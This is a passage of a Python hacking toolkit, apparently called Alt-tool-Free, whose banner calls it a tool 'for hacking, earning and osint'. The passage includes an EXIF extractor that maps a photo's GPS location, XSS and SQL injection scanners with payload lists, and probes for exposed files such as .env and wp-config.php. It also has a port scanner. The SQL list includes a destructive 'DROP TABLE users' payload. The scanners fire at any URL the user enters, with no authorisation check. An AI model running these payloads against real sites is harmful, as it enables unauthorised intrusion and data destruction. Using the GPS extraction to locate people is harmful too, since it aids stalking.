            channel_id = input(f"{Fore.LIGHTGREEN_EX}ID du canal {Fore.LIGHTMAGENTA_EX}>{Fore.LIGHTGREEN_EX} ")
            
            asyncio.run(main(letoken, server_id, channel_id))


elif menu_choice == "12":
    os.system('cls' if os.name == 'nt' else 'clear')
    meta = """
  -%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%*   
  #%%%%%%%%%%%%%%%%%#: .#%: .#%- .#%%%%:  
  #%%%%%%%%%%%%%%%%%%. .#%: .#%-  #%%%%:  
  #%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%:  
  #%:                                *%:  
  #%:                                *%:  
  #%:                ..              *%:  MetaData for image By AltWolf
  #%:                #*              *%:          Version V2.2.1
  #%:       .=*%%-  -%- #%#+:        *%:  
  #%:    +#%%*=.    ##    -*#%%*.    *%:  
  #%:   .#%%*-.    -%-     :+#%%-    *%:  
  #%:       =#%%%- *#   #%%#+:       *%:  
  #%:           -::%=   =            *%:  
  #%:             -=                 *%:  
  #%:                                *%:  
  #%.                                *%:  
  +%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%.  
     ................................    
    """
    print_violet_white_gradient(meta)
    def get_exif_data(image_path):
        try:
            image = Image.open(image_path)
            exif_data = image._getexif()
            return exif_data
        except:
            return None

    def decode_gps_info(gps_info):
        gps_data = {}
        
        for key, value in gps_info.items():
            decoded_key = GPSTAGS.get(key, key)
            gps_data[decoded_key] = value
        
        return gps_data

    def convert_to_degrees(value):
        d = float(value[0])
        m = float(value[1])
        s = float(value[2])
        return d + (m / 60.0) + (s / 3600.0)

    def get_coordinates(gps_info):
        try:
            gps_latitude = gps_info.get('GPSLatitude')
            gps_latitude_ref = gps_info.get('GPSLatitudeRef')
            gps_longitude = gps_info.get('GPSLongitude')
            gps_longitude_ref = gps_info.get('GPSLongitudeRef')
            
            if gps_latitude and gps_latitude_ref and gps_longitude and gps_longitude_ref:
                lat = convert_to_degrees(gps_latitude)
                if gps_latitude_ref != 'N':
                    lat = -lat
                
                lon = convert_to_degrees(gps_longitude)
                if gps_longitude_ref != 'E':
                    lon = -lon
                
                return lat, lon
        except:
            return None, None
        
        return None, None

    def extract_metadata(image_path):
        exif_data = get_exif_data(image_path)
        
        if not exif_data:
            print("No metadata found in this image.")
            return
        
        metadata = {}
        gps_info = None
        
        for tag_id, value in exif_data.items():
            tag = TAGS.get(tag_id, tag_id)
            
            if tag == "GPSInfo":
                gps_info = decode_gps_info(value)
            else:
                metadata[tag] = value
        
        print(f"\nMetadata extracted from: {os.path.basename(image_path)}")
        print("="*60)
        
        if metadata:
            print("\nGeneral Information:")
            for key, value in metadata.items():
                if key not in ['MakerNote', 'UserComment']:
                    print(f"  {key}: {value}")
        
        if gps_info:
            print("\nGPS Information:")
            for key, value in gps_info.items():
                print(f"  {key}: {value}")
            
            lat, lon = get_coordinates(gps_info)
            if lat and lon:
                print(f"\nCoordinates:")
                print(f"  Latitude: {lat}")
                print(f"  Longitude: {lon}")
                print(f"  Google Maps: https://www.google.com/maps?q={lat},{lon}")
        
        file_stats = os.stat(image_path)
        print("\nFile Information:")
        print(f"  File Size: {file_stats.st_size} bytes")
        print(f"  Created: {time.ctime(file_stats.st_ctime)}")
        print(f"  Modified: {time.ctime(file_stats.st_mtime)}")
        
        print("="*60)

    def main():
        print("Photo Metadata Extractor\n")
        
        image_path = input("Enter path to image file: ").strip()
        
        if not os.path.exists(image_path):
            print("Error: File not found.")
        elif not image_path.lower().endswith(('.jpg', '.jpeg', '.png', '.tiff', '.bmp')):
            print("Error: Unsupported file format.")
        else:
            extract_metadata(image_path)
        
        input("\nPress enter to continue...")
        time.sleep(1)
        os.system("python Alt-tool-Free.py")

    if __name__ == "__main__":
        main()


elif menu_choice == "13":
        os.system('cls' if os.name == 'nt' else 'clear')
        xss = """
             %%%%*               
           -%%%%%%%+             
        :==*%#%%%%#*++=          
           :%*#@#*=.             
           :%##@=-=.             
             %#=---.             
          ===++++-               
          ++++++**+:             
          =++++++++++            
        -++****+++**+            
        =*+****+++*+-            
        =******+++*-             
        =*++***+++*-          
          +++**+++**=        XSS Search By AltWolf    
           :***+++***           Version Free
           :%%%#@@#-             
          ****++**+*+            
          ***+++##**+            
        =**+=++*###*+            
        +**+++*%%%%#*            
     :=*++++*#+:*%%#*            
     #**+++++   =%%#=            
     #*****#*   =%%+             
        +%%:    =%%%#            
        +%%:      *%*            
      .####.      *%*            
      .##*=       *%*            
      .##=        *%*            
      .##=        *%*            
      :%%#+       *%%*=           
        """
        print_violet_white_gradient(xss)
        xss_payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "\"'><script>alert(1)</script>",
            "<svg/onload=alert(1)>",
            "<body onload=alert(1)>",
            "<iframe src=javascript:alert(1)>",
            "<div onmouseover=alert(1)>Hover Me</div>",
            "<input type=text value=\"\"><script>alert(1)</script>",
            "</textarea><script>alert(1)</script>",
            "\";alert(1)//",
            "<img src=x onerror=prompt(1)>",
            "<svg onload=confirm(1)>",
            "javascript:alert(1)",
            "<details open ontoggle=alert(1)>",
            "<marquee onstart=alert(1)>",
            "<style>@import'javascript:alert(1)';</style>",
            "<object data=javascript:alert(1)>",
            "<embed src=javascript:alert(1)>",
            "<base href=javascript:alert(1)//>",
            "<math><mi//xlink:href=\"data:x,<script>alert(1)</script>\">"
        ]

        def test_xss_vulnerability(url, method="GET", data=None):
            vulnerable_count = 0
            safe_count = 0
            
            for payload in xss_payloads:
                try:
                    if method == "GET":
                        test_url = url + "?test=" + payload
                        response = requests.get(test_url, timeout=10)
                    else:
                        response = requests.post(url, data={"test": payload}, timeout=10)
                    
                    if payload in response.text:
                        print(f"[!] Potentially vulnerable with payload: {payload}")
                        vulnerable_count += 1
                    else:
                        safe_count += 1
                
                except requests.exceptions.RequestException as e:
                    print(f"[X] Error with payload: {e}")
            
            return vulnerable_count, safe_count

        def check_get_and_post_xss(url):
            print(f"\nTesting GET parameters for {url}...")
            get_vuln, get_safe = test_xss_vulnerability(url, method="GET")
            
            print(f"\nTesting POST parameters for {url}...")
            post_vuln, post_safe = test_xss_vulnerability(url, method="POST")
            
            total_vuln = get_vuln + post_vuln
            total_safe = get_safe + post_safe
            
            print(f"\n{'='*60}")
            print(f"SCAN RESULTS FOR: {url}")
            print(f"{'='*60}")
            print(f"Total vulnerable payloads: {total_vuln}")
            print(f"Total safe payloads: {total_safe}")
            print(f"{'='*60}\n")

        if __name__ == "__main__":
            target_url = input("Enter website URL to test for XSS vulnerability: ")
            
            if not target_url.startswith("http"):
                target_url = "https://" + target_url
            
            check_get_and_post_xss(target_url)
            
            input("Press enter to continue...")
            time.sleep(1)
            os.system("python Alt-tool-Free.py")

elif menu_choice == "14":
        os.system('cls' if os.name == 'nt' else 'clear')
        sql = """                       
                 ............                
          ..:--------------------::.         
       .:----:..              ..:-----.      
      :--:.                        .:--:.    
     .--.                             --.    
     .---.                          .:--:    
     .------..                  ..:-----:    
     .--..::---------::::----------:..--:    
     .--.     ...:::::::::::::..      --:    
     .--.                             --:    SQL Search By AltWolf
     .--:.                           :--:       Version Free
     .-----:..                   ..:----:    
     .--..:------:::.......::------:..--:    
     .--.     ..::----------::...     --:    
     .--.                             --:    
     .--:.                           :--:    
     .----::.                    .::----:    
     .--..-----::::........::::-----:.--:    
     .--.    ..::------------::..     --:    
     .--.                             --:    
     .:--.                          .:--.    
       :----:.                  ..----:.     
         .:-------------:----------:.        
              ...::--------::...             
        """
        print_violet_white_gradient(sql)
        def test_sql_injection(url, payloads):
            vulnerable_count = 0
            safe_count = 0
            
            print(f"\nTesting SQL injection on: {url}\n")
            
            for payload in payloads:
                test_url = f"{url}?id={payload}"
                try:
                    response = requests.get(test_url, timeout=10)
                    content = response.text.lower()
                    
                    sql_errors = [
                        "error",
                        "sql syntax",
                        "mysql",
                        "warning",
                        "unclosed quotation",
                        "quoted string",
                        "sql server",
                        "oracle",
                        "postgresql",
                        "sqlite",
                        "database error",
                        "syntax error",
                        "unexpected end",
                        "you have an error"
                    ]
                    
                    if any(error in content for error in sql_errors):
                        print(f"[+] Possible SQL injection detected with payload: {payload}")
                        vulnerable_count += 1
                    else:
                        safe_count += 1
                        
                except requests.RequestException as e:
                    print(f"[X] Error testing payload {payload}: {e}")
            
            print(f"\n{'='*60}")
            print(f"SCAN RESULTS FOR: {url}")
            print(f"{'='*60}")
            print(f"Total vulnerable payloads: {vulnerable_count}")
            print(f"Total safe payloads: {safe_count}")
            print(f"{'='*60}\n")

        if __name__ == "__main__":
            target_url = input("Enter target URL (e.g., http://example.com/page.php): ").strip()
            
            if not target_url.startswith("http"):
                target_url = "https://" + target_url
            
            sql_payloads = [
                "1' OR '1'='1",
                "1' OR '1'='1' --",
                "1' OR '1'='1' /*",
                "1' AND 1=CONVERT(int, (SELECT @@version)) --",
                "1' AND 1=1 --",
                "1' AND 1=2 --",
                "' OR '' = '",
                "1 OR 1=1",
                "admin' --",
                "admin' #",
                "' OR 1=1 --",
                "' OR 'x'='x",
                "1'; DROP TABLE users--",
                "1' UNION SELECT NULL--",
                "1' AND '1'='1",
                "' WAITFOR DELAY '00:00:05'--",
                "1; SELECT * FROM users",
                "' OR '1'='1' ({",
                "1' ORDER BY 1--",
                "1' UNION ALL SELECT NULL,NULL--"
            ]
            
            test_sql_injection(target_url, sql_payloads)
            
            input("Press enter to continue...")
            time.sleep(1)
            os.system("python Alt-tool-Free.py")


if menu_choice == "15":
            os.system('cls' if os.name == 'nt' else 'clear')
            vuln = """               
             .=*++++*=            
          :+.          :=.        
        .=   .-=-::-=-   .=       
       :-  .+          +   +      
       =  -=            =:  #     
      -:  +              -  -:    
      +  .=              -  .=    
      +  .=              -  .=    
    :=-::::::::::::::::::::::-=.        Vulnerability Search by AltWolf
   -:                          -.                Version Free
   -                           :: 
   -           -=::=:          :: 
   -          :-    =          :: 
   -           =.  -:          :: 
   -           =.  -:          :: 
   -           =   ::          :: 
   -           =   ::          :: 
   -           :-::-.          :: 
   -                           :: 
   :-                          =  
     *************************=   
            """
            print_violet_white_gradient(vuln)
            def check_http_headers(url):
                print(f"Checking HTTP headers for {url}...")
                try:
                    response = requests.get(url, timeout=10)
                    headers = response.headers
                    issues_found = []

                    recommendations = {
                        'Content-Security-Policy': "Mitigates XSS attacks by defining where resources can be loaded from.",
                        'Strict-Transport-Security': "Forces browsers to use HTTPS, preventing MITM attacks.",
                        'X-Content-Type-Options': "Prevents browsers from interpreting files as different MIME types.",
                        'X-Frame-Options': "Protects against clickjacking by controlling iframe embedding.",
                        'X-XSS-Protection': "Enables browser built-in XSS protection.",
                        'Referrer-Policy': "Controls referrer information included with requests.",
                        'Permissions-Policy': "Controls which features and APIs can be used."
                    }

                    for header, recommendation in recommendations.items():
                        if header not in headers:
                            issues_found.append((header, f"Missing: {recommendation}"))

                    return issues_found
                except Exception as e:
                    return [("HTTP Headers", f"Error checking headers: {e}")]

            def check_sensitive_files(url):
                print("Checking for sensitive files...")
                sensitive_files = [
                    'robots.txt', '.git', '.env', '.htaccess', 'config.php',
                    'web.config', '.svn', 'backup.sql', 'phpinfo.php',
                    'admin', 'phpmyadmin', '.DS_Store', 'wp-config.php'
                ]
                issues_found = []

                for file in sensitive_files:
                    file_url = url.rstrip('/') + '/' + file
                    try:
                        response = requests.get(file_url, timeout=5)
                        if response.status_code == 200:
                            issues_found.append((file, f"Sensitive file found: {file_url}"))
                    except:
                        pass

                return issues_found

            def check_for_vulnerabilities(url):
                print(f"Checking for common vulnerabilities on {url}...")
                issues_found = []

                sql_payloads = ["' OR '1'='1", "' OR '1'='1' --", "' OR '1'='1' /*"]
                for payload in sql_payloads:
                    try:
                        response = requests.get(url, params={"id": payload}, timeout=5)
                        content = response.text.lower()
                        if any(err in content for err in ["mysql", "syntax", "sql", "database error"]):
                            issues_found.append(("SQL Injection", f"Potential vulnerability with payload: {payload}"))
                            break
                    except:
                        pass

                xss_payloads = ["<script>alert('XSS')</script>", "<img src='x' onerror='alert(1)'>"]
                for payload in xss_payloads:
                    try:
                        response = requests.get(url, params={"q": payload}, timeout=5)
                        if payload in response.text:
                            issues_found.append(("XSS", f"Potential vulnerability with payload: {payload}"))
                            break
                    except:
                        pass

                return issues_found

            def check_open_ports(url):
                print(f"Checking open ports for {url}...")
                issues_found = []
                ports_to_check = [80, 443, 21, 22, 25, 110, 143, 3306, 3389, 8080, 8443, 8888]
                
                try:
                    hostname = url.replace("https://", "").replace("http://", "").split('/')[0]
                    ip = socket.gethostbyname(hostname)

                    for port in ports_to_check:
                        try:
                            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            sock.settimeout(1)
                            result = sock.connect_ex((ip, port))
                            if result == 0:
                                issues_found.append((f"Port {port}", f"Open port found: {port}"))
                            sock.close()
                        except:
                            pass
                except Exception as e:
                    issues_found.append(("Port Scan", f"Error scanning ports: {e}"))

                return issues_found

            def check_ssl_certificate(url):
                print(f"Checking SSL certificate for {url}...")
                issues_found = []
                
                try:
                    hostname = url.replace("https://", "").replace("http://", "").split('/')[0]
                    context = ssl.create_default_context()
                    conn = context.wrap_socket(socket.socket(socket.AF_INET), server_hostname=hostname)
                    conn.settimeout(5.0)
                    conn.connect((hostname, 443))
                    cert = conn.getpeercert()
                    
                    issues_found.append(("SSL Certificate", "SSL certificate is valid"))
                    conn.close()
                    
                except ssl.SSLError as e:
                    issues_found.append(("SSL Certificate", f"SSL error: {e}"))
                except Exception as e:
                    issues_found.append(("SSL Certificate", f"Error checking certificate: {e}"))

                return issues_found

            def main():
                url = input("Enter URL to scan (e.g., https://example.com): ").strip()

                if not url.startswith("http"):
                    url = "https://" + url

                print(f"\nStarting security scan for {url}...\n")
                
                issues = []
                issues.extend(check_http_headers(url))
                issues.extend(check_sensitive_files(url))
                issues.extend(check_for_vulnerabilities(url))
                issues.extend(check_open_ports(url))
                issues.extend(check_ssl_certificate(url))

                print(f"\n{'='*60}")
                print(f"SCAN RESULTS FOR: {url}")
                print(f"{'='*60}\n")
                
                if issues:
                    print(f"Total issues found: {len(issues)}\n")
                    for issue in issues:
                        print(f"[!] {issue[0]}: {issue[1]}")
                else:
                    print("No vulnerabilities found.")
                
                print(f"\n{'='*60}\n")
                
                input("Press enter to continue...")
                time.sleep(1)
                os.system("python Alt-tool-Free.py")

            if __name__ == "__main__":
                main()

if menu_choice == "16":
        os.system('cls' if os.name == 'nt' else 'clear')
        namp = """                                   
                  .+#@@@@@@@@@@@#+.                 
              *@@@@@@@@@@@@@@@@@@@@@@@*             
          .%@@# .%@@#     *    +@@@- .#@@%          
        +@@*   *@@=    -:.#.-*:  :@@#    #@@+       
      +@@-    *@@       .+%-...=-  %@%     =@@=     
     %@+      @@-        .#.:#...=  @@-      +@@       Scanner Web By AltWolf
   =@%       +@%  *..*: +@@#.:*..+  %@%        @@=       Version Free
   -@@       =@%  *..=:.-%@+..+..+  %@#        @@-  
     %@*      @@+  +..=+..#.=+..-- :@@.      *@@    
      =@@=    =@@-  *:...:#....*   @@*     +@@-     
        =@@#   :@@%   -%++%+#=   *@@+    %@@-       
           #@@#. *@@@+    *   =@@@#  :#@@#          
              +%@@@@@@@@@@@@@@@@@%%@@%+             
                   =%@@@@@@@@@@@%=    
        """
        print_violet_white_gradient(namp)
        def get_ports_open(url):
            try:
                parsed_url = urlparse(url)
                host = parsed_url.netloc
                
                if not host:
                    host = url.replace("https://", "").replace("http://", "").split('/')[0]

                ip_address = socket.gethostbyname(host)
                print(f"IP address of {host}: {ip_address}\n")

                common_ports = {
                    21: "FTP",
                    22: "SSH",
                    23: "Telnet",
                    25: "SMTP",
                    53: "DNS",
                    80: "HTTP",
                    110: "POP3",
                    143: "IMAP",
                    443: "HTTPS",
                    3306: "MySQL",
                    3389: "RDP",
                    5432: "PostgreSQL",
                    6379: "Redis",
                    8080: "HTTP Proxy",
                    8443: "HTTPS Alt",
                    27017: "MongoDB"
                }

                open_ports = []
                print("Scanning ports...\n")
                
                for port, service in common_ports.items():
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(1)
                    result = sock.connect_ex((host, port))
                    sock.close()
                    
                    if result == 0:
                        open_ports.append((port, service))
                        print(f"[+] Port {port} ({service}) is open")

                return open_ports

            except socket.gaierror as e:
                print(f"DNS resolution error: {e}")
                return []
            except socket.error as e:
                print(f"Socket connection error: {e}")
                return []
            except Exception as e:
                print(f"Error: {e}")
                return []

        if __name__ == "__main__":
            url = input("Enter website URL to scan (e.g., https://example.com): ")
            
            if not url.startswith("http"):
                url = "https://" + url

            print(f"\nAnalyzing open ports for {url}...\n")
            open_ports = get_ports_open(url)
            
            print(f"\n{'='*60}")
            if open_ports:
                print(f"Found {len(open_ports)} open port(s) on {url}:\n")
                for port, service in open_ports:
                    print(f"  Port {port} ({service})")
            else:
                print("No open ports found.")
            print(f"{'='*60}\n")
            
            input("Press enter to continue...")
            time.sleep(1)
            os.system("python Alt-tool-Free.py")


elif menu_choice == "17":
        os.system('cls' if os.name == 'nt' else 'clear')
        capp = """
                    @@@%%###%%@@@                        
                 @#++===========++#@                     
              @#*===================*#@                  
            @%*=======================*%@         ╔═══╗╔╗  ╔╗ ╔═══╗       ╔╗        
           @#++*#+========+========+#*++#@        ║╔═╗║║║ ╔╝╚╗║╔═╗║       ║║        
          @#+#%#*====+==+++*+==+====*###+*@       ║║ ║║║║ ╚╗╔╝║╚══╗╔══╗ ╔═╝║        
         @##*#%*=========++%=========+%#*##@      ║╚═╝║║║  ║║ ╚══╗║╚ ╗║ ║╔╗║        
         @*#%*#+===+======*======+===+####*%      ║╔═╗║║╚╗ ║╚╗║╚═╝║║╚╝╚╗║╚╝║       
         %####=========+==+==+=========#%###      ╚╝ ╚╝╚═╝ ╚═╝╚═══╝╚═══╝╚══╝      
        @#####*++++++++*%=@=@#++++++++*%*###@            
         %##@#++===+%@@@#=@=*@@@@+===++*@%*#     Hello, we are AltSad, the creators of the Alt-tool.        
         %###*#+===*@@@@@=@=@@@@@*===+#*###%     If you encounter any issues, there's a "contact" option.        
         @#*#%%%*==#@@@@@@@@@@@@@#==+%%%%*#@     I hope you'll enjoy the tool.        
          @#*##*%*+%@@@@@@@@@@@@@%+*%*##*#@      It's a tool for hacking , earning and osint ! Enjoy !                                                       
           @#*#%@%%@@@@@@@@@@@@@@@%%@%#*#@       If you want contact me use discord ! : altwolf or altsad        
            @#**###%%%@@@@@@@@@%@%###**%@        
              @#****#%@@@@@@@@@%%****#@          Team AltSad.        
                 @#+++@@@@@@@@@+++#@@                    
                    @@@@@@@@@@@@@ 
        """
        print_violet_white_gradient(capp)
        input("faite entré pour quitter...")
        os.system("python Alt-tool-Free.py")

elif menu_choice == "18":
        os.system('cls' if os.name == 'nt' else 'clear')
        capp = """
                    @@@%%###%%@@@                        
                 @#++===========++#@                     
              @#*===================*#@                  
            @%*=======================*%@         ╔═══╗╔╗  ╔╗ ╔═══╗       ╔╗        
           @#++*#+========+========+#*++#@        ║╔═╗║║║ ╔╝╚╗║╔═╗║       ║║        
          @#+#%#*====+==+++*+==+====*###+*@       ║║ ║║║║ ╚╗╔╝║╚══╗╔══╗ ╔═╝║        
         @##*#%*=========++%=========+%#*##@      ║╚═╝║║║  ║║ ╚══╗║╚ ╗║ ║╔╗║        
         @*#%*#+===+======*======+===+####*%      ║╔═╗║║╚╗ ║╚╗║╚═╝║║╚╝╚╗║╚╝║       
         %####=========+==+==+=========#%###      ╚╝ ╚╝╚═╝ ╚═╝╚═══╝╚═══╝╚══╝      
        @#####*++++++++*%=@=@#++++++++*%*###@            
         %##@#++===+%@@@#=@=*@@@@+===++*@%*#     If you want to follow the few updates        
         %###*#+===*@@@@@=@=@@@@@*===+#*###%     that may come for this tool: https://discord.gg/7kFRXD6A       
         @#*#%%%*==#@@@@@@@@@@@@@#==+%%%%*#@        
          @#*##*%*+%@@@@@@@@@@@@@%+*%*##*#@                                                           
           @#*#%@%%@@@@@@@@@@@@@@@%%@%#*#@              
            @#**###%%%@@@@@@@@@%@%###**%@        AltWolf  
              @#****#%@@@@@@@@@%%****#@               
                 @#+++@@@@@@@@@+++#@@                    
                    @@@@@@@@@@@@@ 
        """
        print_violet_white_gradient(capp)
        input("faite entré pour quitter...")
        os.system("python Alt-tool-Free.py")